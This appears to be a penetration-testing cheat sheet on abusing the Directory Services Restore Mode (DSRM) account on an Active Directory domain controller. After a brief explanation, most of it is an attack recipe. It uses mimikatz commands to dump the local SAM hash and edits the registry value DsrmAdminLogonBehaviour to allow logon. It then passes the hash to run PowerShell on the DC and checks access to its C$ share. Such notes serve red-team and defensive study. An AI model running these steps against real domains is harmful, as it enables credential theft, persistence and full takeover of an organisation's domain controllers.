- Stands for Directory Services Restore Mode.
- By default, we can't login as the local Administrator in the DC. The password for this account is the DSRM password which was setup during the server installation.
- DSRM password is also called the SafeMode password. It is required when a server is promoted to Domain Controller, or when the server is rebooted in the Safe Mode.
# Abuse
- Dump DSRM password (Required Domain Administrator Privs)
```powershell
token::elevate
lsadump::sam # As DSRM password is a local account, we dump the local SAM database.
```
- This DSRM password can be used to perform Pass-The-Hash attacks
```powershell
# Registry edits are required to enable logon using the local admin
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD

# Can be verified with
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa"

# Now the hash of this Account can be used to perform pass the hash and get command exection on the DC
sekurlsa::pth /domain:<dc-hostname> /user:Administrator /ntlm:<hash> /run:powershell.exe

# verificaiton
ls \\<dc-machine>\C$
```